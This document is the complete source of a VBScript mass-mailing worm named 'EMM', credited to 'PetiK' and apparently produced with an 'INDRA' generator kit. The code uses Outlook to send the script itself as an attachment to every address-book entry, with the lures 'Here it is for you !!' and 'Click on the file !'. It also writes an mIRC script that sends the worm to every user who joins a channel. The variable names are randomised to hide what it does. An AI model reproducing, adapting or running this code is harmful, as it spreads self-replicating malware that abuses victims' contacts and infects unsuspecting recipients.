'Worm Name: EMM
'Written By: PetiK
'[INDRA]
On Error Resume Next
qoefnixoixojlbb = WScript.ScriptFullName
Set gwubefskmayrbrf = CreateObject("WScript.Shell") 
Set jcockmymnauoasl = CreateObject("Outlook.Application")
If jcockmymnauoasl <> "" Then
Set uarfwouyagjcsld = jcockmymnauoasl.GetNameSpace("MAPI")
For yfjbmixacrunubi = 1 to uarfwouyagjcsld.AddressLists.Count
Set pckatxitqpfitxa = jcockmymnauoasl.CreateItem(0)
Set lplfpphtjyjodqt = uarfwouyagjcsld.AddressLists.Item(yfjbmixacrunubi)
pckatxitqpfitxa.Attachments.Add qoefnixoixojlbb
pckatxitqpfitxa.Subject = "Here it is for you !!"
pckatxitqpfitxa.Body = "Click on the file !"
Set fylhkriusvkkjjg = lplfpphtjyjodqt.AddressEntries
Set nkkbnbthaoyhgcd = pckatxitqpfitxa.Recipients
For hqamollicsilmmb = 1 to fylhkriusvkkjjg.Count
pckatxitqpfitxa.Recipients.Add fylhkriusvkkjjg.Item(hqamollicsilmmb)
Next
pckatxitqpfitxa.Send
Next
End If
Set iplvccyollvpkgc = CreateObject("Scripting.FileSystemObject")
Set uqufsikgbcpqcut = iplvccyollvpkgc.CreateTextFile("C:\mirc\script.ini", True)
uqufsikgbcpqcut.WriteLine "[script]"
uqufsikgbcpqcut.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
uqufsikgbcpqcut.Write "n1=/dcc           send         $nick """
uqufsikgbcpqcut.Write qoefnixoixojlbb
uqufsikgbcpqcut.WriteLine """ }"
uqufsikgbcpqcut.Close
'Generated with [INDRA] v0.2.
